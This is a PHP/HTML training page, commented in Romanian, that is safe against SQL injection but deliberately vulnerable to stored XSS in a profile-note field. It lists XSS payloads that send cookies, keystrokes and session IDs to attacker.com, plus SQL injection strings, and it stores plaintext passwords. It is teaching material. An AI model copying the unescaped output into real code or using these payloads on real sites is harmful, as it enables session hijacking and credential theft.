<?php
// Activează afișarea erorilor pentru debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ATENȚIE: Acest cod este SECURIZAT pentru SQL injection dar VULNERABIL pentru XSS
// Folosește doar în mediu de testare/educațional, NICIODATĂ în producție!

// Configurarea bazei de date
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "test_db";

$conn = null;
$setup_message = "";

// Funcție pentru setup-ul bazei de date - REPARATĂ
if (isset($_GET['setup'])) {
    try {
        // Conectează-te la MySQL fără a specifica baza de date
        $conn_setup = new mysqli($servername, $username, $password);
        
        if ($conn_setup->connect_error) {
            throw new Exception("Connection failed: " . $conn_setup->connect_error);
        }
        
        // Creează baza de date
        $sql_create_db = "CREATE DATABASE IF NOT EXISTS test_db";
        if ($conn_setup->query($sql_create_db) === TRUE) {
            $setup_message .= "Database 'test_db' created successfully.<br>";
        }
        
        // Selectează baza de date
        $conn_setup->select_db($dbname);
        
        // ȘTERGE COMPLET tabelul pentru a evita conflictele de structură
        $conn_setup->query("DROP TABLE IF EXISTS users");
        $setup_message .= "Old table 'users' dropped.<br>";
        
        // Creează tabelul cu STRUCTURA COMPLETĂ
        $sql_create_table = "CREATE TABLE users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(50) NOT NULL UNIQUE,
            password VARCHAR(50) NOT NULL,
            email VARCHAR(100),
            role VARCHAR(20) DEFAULT 'user',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            profile_note TEXT
        )";
        
        if ($conn_setup->query($sql_create_table) === TRUE) {
            $setup_message .= "Table 'users' created successfully with complete structure.<br>";
        } else {
            throw new Exception("Error creating table: " . $conn_setup->error);
        }
        
        // Inserează utilizatori de test FOLOSIND PREPARED STATEMENTS
        $users = [
            ['admin', 'admin123', 'admin@test.com', 'admin', 'System Administrator'],
            ['user1', 'password1', 'user1@test.com', 'user', 'Regular User'],
            ['test', 'test123', 'test@test.com', 'user', 'Test Account'],
            ['guest', 'guest', 'guest@test.com', 'guest', 'Guest Account'],
            ['john', 'john2024', 'john@company.com', 'manager', 'Manager Profile']
        ];
        
        // SECURE: Folosește prepared statements pentru insert
        $stmt = $conn_setup->prepare("INSERT INTO users (username, password, email, role, profile_note) VALUES (?, ?, ?, ?, ?)");
        
        if (!$stmt) {
            throw new Exception("Prepare failed: " . $conn_setup->error);
        }
        
        foreach ($users as $user) {
            $stmt->bind_param("sssss", $user[0], $user[1], $user[2], $user[3], $user[4]);
            if ($stmt->execute()) {
                $setup_message .= "User '{$user[0]}' added successfully.<br>";
            } else {
                $setup_message .= "Error adding user '{$user[0]}': " . $stmt->error . "<br>";
            }
        }
        
        $stmt->close();
        $conn_setup->close();
        
        $setup_message .= "<strong>Setup completed successfully!</strong><br>";
        
    } catch (Exception $e) {
        $setup_message = "Error during setup: " . $e->getMessage();
    }
}

// Conectează-te la baza de date pentru operațiuni normale
$conn = null;
$db_error = null;

try {
    $conn = new mysqli($servername, $username, $password, $dbname);
    
    if ($conn->connect_error) {
        throw new Exception("Connection failed: " . $conn->connect_error);
    }
    
} catch (Exception $e) {
    $db_error = $e->getMessage();
}

// Gestionarea logout-ului
if (isset($_GET['logout'])) {
    session_start();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Începe sesiunea pentru a păstra starea de login
session_start();

// ✅ SECURE: Procesarea formularului de login cu PREPARED STATEMENTS
$login_result = "";
$executed_query = "";
$sql_error = "";

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    if ($conn === null) {
        $login_result = "error";
        $sql_error = "Database connection is not available. " . ($db_error ? $db_error : "Unknown error");
    } else {
        $user = $_POST['username'];
        $pass = $_POST['password'];
        
        // ✅ SECURE: Folosește prepared statements pentru a preveni SQL injection
        $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
        if (!$stmt) {
            $login_result = "error";
            $sql_error = "Prepare failed: " . $conn->error;
        } else {
            $stmt->bind_param("ss", $user, $pass);
            $executed_query = "SELECT * FROM users WHERE username = ? AND password = ? [Prepared Statement - SECURE]";
            
            try {
                $stmt->execute();
                $result = $stmt->get_result();
                
                if ($result && $result->num_rows > 0) {
                    $row = $result->fetch_assoc();
                    $login_result = "success";
                    $user_data = $row;
                    
                    // Salvează datele utilizatorului în sesiune
                    $_SESSION['logged_in'] = true;
                    $_SESSION['user_id'] = $row['id'];
                    $_SESSION['username'] = $row['username'];
                    $_SESSION['email'] = $row['email'];
                    $_SESSION['role'] = $row['role'];
                    $_SESSION['profile_note'] = $row['profile_note'];
                    $_SESSION['login_time'] = date('Y-m-d H:i:s');
                } else {
                    $login_result = "failed";
                }
                
                $stmt->close();
                
            } catch (Exception $e) {
                $login_result = "error";
                $sql_error = $e->getMessage();
            }
        }
    }
}

// ❌ VULNERABLE: Profile update cu XSS vulnerability
$profile_update_message = "";
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['update_profile']) && isset($_SESSION['logged_in'])) {
    if ($conn === null) {
        $profile_update_message = "Database connection error.";
    } else {
        $new_note = $_POST['profile_note']; // ❌ NO XSS PROTECTION!
        
        // ✅ SECURE SQL: Folosește prepared statement
        $stmt = $conn->prepare("UPDATE users SET profile_note = ? WHERE id = ?");
        if (!$stmt) {
            $profile_update_message = "Error preparing statement: " . $conn->error;
        } else {
            $stmt->bind_param("si", $new_note, $_SESSION['user_id']);
            
            if ($stmt->execute()) {
                $_SESSION['profile_note'] = $new_note; // ❌ Update session fără sanitizare
                $profile_update_message = "Profile updated successfully!";
            } else {
                $profile_update_message = "Error updating profile: " . $stmt->error;
            }
            $stmt->close();
        }
    }
}

if ($conn && !$conn->connect_error) {
    $conn->close();
}
?>

<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure SQL but Vulnerable XSS Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"], textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        textarea {
            height: 100px;
            resize: vertical;
        }
        input[type="submit"], .btn {
            background: #007bff;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            text-decoration: none;
            display: inline-block;
            margin-right: 10px;
        }
        input[type="submit"]:hover, .btn:hover {
            background: #0056b3;
        }
        .warning {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border: 1px solid #ffeaa7;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border: 1px solid #c3e6cb;
            border-radius: 4px;
            margin: 10px 0;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border: 1px solid #f5c6cb;
            border-radius: 4px;
            margin: 10px 0;
        }
        .query-display {
            background: #f8f9fa;
            padding: 15px;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            margin: 10px 0;
            font-family: monospace;
            word-break: break-all;
        }
        .xss-examples {
            background: #e9ecef;
            padding: 20px;
            border-radius: 4px;
            margin-top: 20px;
        }
        .xss-examples h4 {
            margin-top: 0;
            color: #495057;
        }
        .payload {
            background: #fff;
            padding: 8px;
            border-radius: 4px;
            margin: 5px 0;
            font-family: monospace;
            border-left: 4px solid #dc3545;
        }
        .users-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        .users-table th, .users-table td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        .btn-logout {
            background: #dc3545;
            margin-left: 10px;
        }
        .btn-logout:hover {
            background: #c82333;
        }
        .user-session {
            background: #d1ecf1;
            color: #0c5460;
            padding: 15px;
            border: 1px solid #bee5eb;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .session-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .session-details {
            flex: 1;
        }
        .users-table th {
            background-color: #f2f2f2;
        }
        .secure-badge {
            background: #28a745;
            color: white;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 0.8em;
            margin-left: 10px;
        }
        .vulnerable-badge {
            background: #dc3545;
            color: white;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 0.8em;
            margin-left: 10px;
        }
        .profile-display {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            padding: 15px;
            margin: 10px 0;
        }
        @media (max-width: 600px) {
            .session-info {
                flex-direction: column;
                align-items: flex-start;
            }
            .session-actions {
                margin-top: 10px;
            }
        }
    </style>
</head>
<body>
    <!-- User Session Status -->
    <?php if (isset($_SESSION['logged_in']) && $_SESSION['logged_in']): ?>
    <div class="container">
        <div class="user-session">
            <div class="session-info">
                <div class="session-details">
                    <strong>🔐 Sesiune activă:</strong><br>
                    <strong>User:</strong> <?php echo htmlspecialchars($_SESSION['username']); ?> 
                    (<?php echo htmlspecialchars($_SESSION['role']); ?>)<br>
                    <strong>Email:</strong> <?php echo htmlspecialchars($_SESSION['email']); ?><br>
                    <strong>Login time:</strong> <?php echo $_SESSION['login_time']; ?><br>
                    <strong>Session ID:</strong> <?php echo substr(session_id(), 0, 10) . '...'; ?>
                </div>
                <div class="session-actions">
                    <a href="?logout=1" class="btn btn-logout">🚪 Logout</a>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <div class="warning">
        <strong>⚠️ ATENȚIE:</strong> Acest formular este <span class="secure-badge">SECURIZAT pentru SQL injection</span> dar <span class="vulnerable-badge">VULNERABIL pentru XSS attacks</span> în mod intenționat pentru scopuri educaționale!
    </div>

    <!-- Database Status -->
    <div class="container">
        <h3>📊 Database Status</h3>
        <?php if ($conn): ?>
            <div class="success">
                <strong>✅ Database Connection:</strong> SUCCESS<br>
                <strong>Server:</strong> <?php echo $servername; ?><br>
                <strong>Database:</strong> <?php echo $dbname; ?>
            </div>
        <?php else: ?>
            <div class="error">
                <strong>❌ Database Connection:</strong> FAILED<br>
                <?php if ($db_error): ?>
                    <strong>Error:</strong> <?php echo htmlspecialchars($db_error); ?><br>
                <?php endif; ?>
                <small>Asigură-te că MySQL rulează și rulează setup-ul mai întâi.</small>
            </div>
        <?php endif; ?>
    </div>

    <div class="container">
        <h3>🔧 Setup Baza de Date</h3>
        <?php if ($setup_message): ?>
            <div class="success">
                <strong>Setup Status:</strong><br>
                <?php echo $setup_message; ?>
            </div>
        <?php endif; ?>
        
        <a href="?setup=1" class="btn">Creează/Resetează Baza de Date</a>
        
        <h4>Utilizatori de test:</h4>
        <table class="users-table">
            <tr>
                <th>Username</th>
                <th>Password</th>
                <th>Role</th>
            </tr>
            <tr><td>admin</td><td>admin123</td><td>admin</td></tr>
            <tr><td>user1</td><td>password1</td><td>user</td></tr>
            <tr><td>test</td><td>test123</td><td>user</td></tr>
            <tr><td>guest</td><td>guest</td><td>guest</td></tr>
            <tr><td>john</td><td>john2024</td><td>manager</td></tr>
        </table>
    </div>

    <!-- Login Form -->
    <?php if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']): ?>
    <div class="container">
        <h2>🔐 Login Form <span class="secure-badge">SQL SECURE</span></h2>
        
        <form method="POST" action="">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <input type="submit" value="Login">
        </form>

        <!-- Results -->
        <?php if ($executed_query): ?>
            <div class="query-display">
                <strong>SQL Query Method:</strong><br>
                <?php echo $executed_query; ?>
            </div>
        <?php endif; ?>

        <?php if ($login_result == "success"): ?>
            <div class="success">
                <h3>✅ Login reușit!</h3>
                <strong>Bun venit, <?php echo htmlspecialchars($user_data['username']); ?>!</strong><br>
                <strong>Email:</strong> <?php echo htmlspecialchars($user_data['email']); ?><br>
                <strong>Role:</strong> <?php echo htmlspecialchars($user_data['role']); ?><br>
                <strong>ID:</strong> <?php echo htmlspecialchars($user_data['id']); ?><br>
                <small>Pagina se va reîncărca pentru a afișa sesiunea...</small>
                <script>setTimeout(function(){ window.location.reload(); }, 2000);</script>
            </div>
        <?php elseif ($login_result == "failed"): ?>
            <div class="error">
                <strong>❌ Login failed!</strong><br>
                Username sau password greșite.
            </div>
        <?php elseif ($login_result == "error"): ?>
            <div class="error">
                <strong>💥 SQL Error:</strong><br>
                <?php echo htmlspecialchars($sql_error); ?>
            </div>
        <?php endif; ?>
    </div>
    <?php else: ?>
    
    <!-- User Dashboard with XSS Vulnerability -->
    <div class="container">
        <h2>🎯 Dashboard - Utilizator Autentificat <span class="vulnerable-badge">XSS VULNERABLE</span></h2>
        <div class="success">
            <h3>Bun venit în zona securizată!</h3>
            <p>Ești logat ca <strong><?php echo htmlspecialchars($_SESSION['username']); ?></strong> cu rolul de <strong><?php echo htmlspecialchars($_SESSION['role']); ?></strong>.</p>
            
            <h4>Informații sesiune:</h4>
            <ul>
                <li><strong>User ID:</strong> <?php echo $_SESSION['user_id']; ?></li>
                <li><strong>Email:</strong> <?php echo htmlspecialchars($_SESSION['email']); ?></li>
                <li><strong>Timp login:</strong> <?php echo $_SESSION['login_time']; ?></li>
                <li><strong>Session ID:</strong> <?php echo session_id(); ?></li>
            </ul>
        </div>
    </div>

    <!-- Profile Update Form - XSS VULNERABLE -->
    <div class="container">
        <h3>👤 Update Profile <span class="vulnerable-badge">XSS VULNERABLE</span></h3>
        
        <?php if (isset($profile_update_message)): ?>
            <div class="success"><?php echo $profile_update_message; ?></div>
        <?php endif; ?>
        
        <form method="POST" action="">
            <div class="form-group">
                <label for="profile_note">Profile Note/Bio:</label>
                <textarea id="profile_note" name="profile_note" placeholder="Enter your profile information, links, or notes..."><?php echo $_SESSION['profile_note'] ?? ''; ?></textarea>
                <small>❌ This field is vulnerable to XSS attacks!</small>
            </div>
            <input type="hidden" name="update_profile" value="1">
            <input type="submit" value="Update Profile">
        </form>

        <!-- Display Profile Note - XSS VULNERABILITY HERE -->
        <?php if (!empty($_SESSION['profile_note'])): ?>
        <div class="profile-display">
            <h4>Current Profile Note:</h4>
            <!-- ❌ VULNERABLE: Direct output without htmlspecialchars() -->
            <div><?php echo $_SESSION['profile_note']; ?></div>
        </div>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <!-- Security Analysis -->
    <div class="container">
        <h3>🔒 Security Analysis</h3>
        
        <h4>✅ SQL Injection Protection (SECURE):</h4>
        <div class="success">
            <ul>
                <li><strong>✅ Prepared Statements:</strong> All database queries use prepared statements</li>
                <li><strong>✅ Parameter Binding:</strong> User input is properly bound to SQL parameters</li>
                <li><strong>✅ No String Concatenation:</strong> No direct SQL string building</li>
            </ul>
        </div>

        <h4>❌ XSS Vulnerabilities (VULNERABLE):</h4>
        <div class="error">
            <ul>
                <li><strong>❌ Profile Note Display:</strong> Direct output without htmlspecialchars()</li>
                <li><strong>❌ Session Data:</strong> Profile data stored and displayed without sanitization</li>
                <li><strong>❌ No Content Security Policy:</strong> Missing CSP headers</li>
            </ul>
        </div>
    </div>

    <!-- XSS Examples -->
    <div class="container">
        <div class="xss-examples">
            <h4>🎯 XSS Payload Examples pentru Profile Note:</h4>
            
            <h5>1. Basic Alert:</h5>
            <div class="payload">&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</div>
            
            <h5>2. Cookie Stealing:</h5>
            <div class="payload">&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</div>
            
            <h5>3. Keylogger:</h5>
            <div class="payload">&lt;script&gt;document.addEventListener('keypress', function(e) { fetch('http://attacker.com/log.php?key=' + e.key); });&lt;/script&gt;</div>
            
            <h5>4. HTML Injection:</h5>
            <div class="payload">&lt;img src="x" onerror="alert('XSS via img tag')"&gt;</div>
            
            <h5>5. Iframe Injection:</h5>
            <div class="payload">&lt;iframe src="javascript:alert('XSS via iframe')"&gt;&lt;/iframe&gt;</div>
            
            <h5>6. Form Hijacking:</h5>
            <div class="payload">&lt;form onsubmit="alert('Form hijacked: ' + this.username.value); return false;"&gt;&lt;input name="username" placeholder="Fake login"&gt;&lt;/form&gt;</div>
            
            <h5>7. Session Hijacking:</h5>
            <div class="payload">&lt;script&gt;fetch('http://attacker.com/session.php', {method: 'POST', body: 'session_id=' + '<?php echo session_id(); ?>'});&lt;/script&gt;</div>
        </div>
    </div>

    <!-- Failed SQL Injection Examples -->
    <div class="container">
        <div class="xss-examples" style="background: #d4edda;">
            <h4>🛡️ SQL Injection Attempts (TOATE VOR EȘUA):</h4>
            <p><strong>Acestea NU vor funcționa datorită prepared statements:</strong></p>
            
            <h5>Tentative care vor eșua:</h5>
            <div class="payload" style="border-left-color: #28a745;">Username: ' OR '1'='1' -- (VA EȘUA)</div>
            <div class="payload" style="border-left-color: #28a745;">Username: ' UNION SELECT * FROM users -- (VA EȘUA)</div>
            <div class="payload" style="border-left-color: #28a745;">Username: '; DROP TABLE users; -- (VA EȘUA)</div>
            <div class="payload" style="border-left-color: #28a745;">Username: ' AND SLEEP(5) -- (VA EȘUA)</div>
            
            <p><em>Toate aceste payload-uri vor fi tratate ca stringuri literale datorită prepared statements!</em></p>
        </div>
    </div>

    <?php if (isset($db_error)): ?>
    <div class="container">
        <div class="error">
            <strong>Database Connection Error:</strong><br>
            <?php echo htmlspecialchars($db_error); ?><br>
            <small>Asigură-te că MySQL rulează și că ai rulat setup-ul mai întâi.</small>
        </div>
    </div>
    <?php endif; ?>
</body>
</html>